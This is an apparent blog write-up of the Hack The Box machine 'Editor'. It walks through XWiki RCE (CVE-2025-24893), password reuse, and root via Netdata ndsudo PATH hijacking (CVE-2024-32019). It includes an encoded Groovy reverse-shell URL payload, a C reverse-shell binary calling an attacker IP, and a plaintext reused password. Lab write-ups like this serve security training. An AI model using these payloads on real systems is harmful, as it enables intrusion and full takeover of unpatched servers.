---
date: "2025-12-24T00:00:00Z"
title: Editor - Hack The Box
toc: true
displayUpdatedDate: true
enableInlineShortcodes: true
layout: list
---
![Editor Logo](/assets/images/HTB/Editor/Editor-LOGO.png)

Editor is a Linux machine on Hack The Box that highlights the dangers of unpatched *wiki software* and insecure configurations in monitoring tools. The journey starts with identifying a Critical RCE in XWiki (**CVE-2025-24893**) caused by improper input sanitization in Groovy macros. After gaining a foothold, I found database credentials in a configuration file, which allowed for lateral movement to a user via password reuse. Finally, root privileges were obtained by exploiting a vulnerability in the *Netdata agent* (**CVE-2024-32019**) through PATH manipulation.

{{< callout type="info" >}}
  Tags:

{{% details title="show tags"  closed="true" %}}
  - Linux
  - XWiki
  - CVE-2025-24893
  - Groovy
  - Hibernate
  - Password Reuse
  - Netdata
  - CVE-2024-32019
{{% /details %}}
{{< /callout >}}

## Enumeration

I started by running a full Nmap scan to identify open services.
```bash
sudo nmap -sS -sV -sC -p22,80,8080 -Pn -n -vvv -oA nmap/allPorts 10.10.11.80
```
### Port Scan.

```bash
# Nmap 7.95 scan initiated Wed Sep 10 07:15:12 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -p22,80,8080 -Pn -n -vvv -oA nmap/allPorts 10.10.11.80
Nmap scan report for 10.10.11.80
Host is up, received user-set (0.077s latency).
Scanned at 2025-09-10 07:15:15 EDT for 10s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 10 07:15:25 2025 -- 1 IP address (1 host up) scanned in 13.26 seconds
```

The scan reveals port 80 redirecting to `editor.htb` and port 8080 hosting *XWiki*. I added the domain to my /etc/hosts file and proceeded to investigate port 8080.
#### Web Discovery (XWiki)
Visiting http://editor.htb:8080 presented an XWiki instance. Looking at the footer and page source, I identified the *version as 15.10.8*.
![web xwiki version](/assets/images/HTB/Editor/Editor1.png)

Searching for vulnerabilities related to this specific version, I found **CVE-2025-24893**. This is a critical Remote Code Execution (RCE) vulnerability where the search macro fails to properly sanitize input, allowing for Groovy code execution by unauthenticated users. On the following [Link](https://www.ionix.io/blog/xwiki-remote-code-execution-vulnerability-cve-2025-24893/) it is possible to find more information 

## Foothold

### Exploiting CVE-2025-24893
I found a [Python exploit](https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2025-24893.py) script to test for the vulnerability. To verify I had code execution before attempting a shell, I tried to ping my attacking machine.

```bash
python3 CVE-2025-24893.py -t http://editor.htb:8080 -c 'ping -c3 10.10.14.6'
```

Running *tcpdump* on my machine confirmed the ICMP requests.**RCE confirmed!**

```bash
sudo tcpdump -i tun0 icmp -n
```
![RCE with ping](/assets/images/HTB/Editor/Editor2.png)

### Getting a Reverse Shell
To get a stable shell, I needed a more robust payload. I found a Proof of Concept on [GitHub](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC) that injects a reverse shell command. I set up my listener and executed the exploit URL targeting the SolrSearch endpoint with a Groovy payload.

```
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho,YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNS80NDMgMD4mMSc=%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```
Upon sending the request, I received a connection back as the `xwiki` user.

![Payload sent](/assets/images/HTB/Editor/Editor3.png)

## Lateral Movement
### Finding Credentials
Once inside, I started looking for configuration files associated with XWiki. I located `/etc/xwiki/hibernate.cfg.xml`, which typically contains database connection details.

```Bash
cat /etc/xwiki/hibernate.cfg.xml
```
I found the following credentials:

- **User:** xwiki
- **Password:** theEd1t0rTeam99

I tried logging into the SQL database, but I didn't find any interesting data there. However, checking the /home directory revealed a user named *oliver*. I decided to try these credentials against SSH for Oliver, suspecting password reuse.

```bash
nxc ssh 10.10.11.80 -u oliver -p theEd1t0rTeam99
```

![nxc ssh](/assets/images/HTB/Editor/Editor4.png)


## Privilege escalation

### Enumerating Netdata.

Running `id` as Oliver showed that I was part of the netdata group, this can be found with *linpeas.sh* too.

```Bash
uid=1001(oliver) gid=1001(oliver) groups=1001(oliver),998(netdata)
```
![netdata linpeas](/assets/images/HTB/Editor/Editor5.png)

![netdata linpeas2](/assets/images/HTB/Editor/Editor6.png)

**Netdata** is a real-time performance monitoring tool; Think of it as a tool that gives you immediate, high-resolution insights into your IT infrastructure, including servers, containers, and applications. I investigated the permissions associated with this group and found a binary ndsudo located at `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo.`

Researching recent vulnerabilities for Netdata, I came across **CVE-2024-32019**. This vulnerability exists in the ndsudo tool, which allows specific **commands to be executed with root privileges.** The issue is that it doesn't properly sanitize the environment variables, specifically PATH, allowing us to hijack the execution flow.

### Exploiting CVE-2024-32019 (PATH Manipulation)

I found a PoC written in C on [GitHub](https://github.com/AliElKhatteb/CVE-2024-32019-POC). The strategy is to create a malicious binary named nvme (*one of the allowed commands for ndsudo*), update the PATH variable to point to our current directory, and then execute ndsudo.

First, I create and compiled the malicious code:

```c
#include <unistd.h>  // for setuid, setgid, execl
#include <stddef.h>  // for NULL

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1", NULL);
    return 0;
}
```

```bash
#compile the C program 
x86_64-linux-gnu-gcc -o nvme exploit.c -static
```

![c compiled](/assets/images/HTB/Editor/Editor7.png)


#### Running exploit

After transferring the compiled binary to the victim machine, I executed the attack:

```Bash
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
The ndsudo binary tried to execute *nvme-list*, but due to the modified PATH, it ***executed my malicious nvme binary instead.***

I successfully gained a root shell!

![Root shell](/assets/images/HTB/Editor/Editor8.png)

## Resources
- https://www.ionix.io/blog/xwiki-remote-code-execution-vulnerability-cve-2025-24893/
- https://www.rapid7.com/db/modules/exploit/linux/local/ndsudo_cve_2024_32019/
- https://github.com/AliElKhatteb/CVE-2024-32019-POC
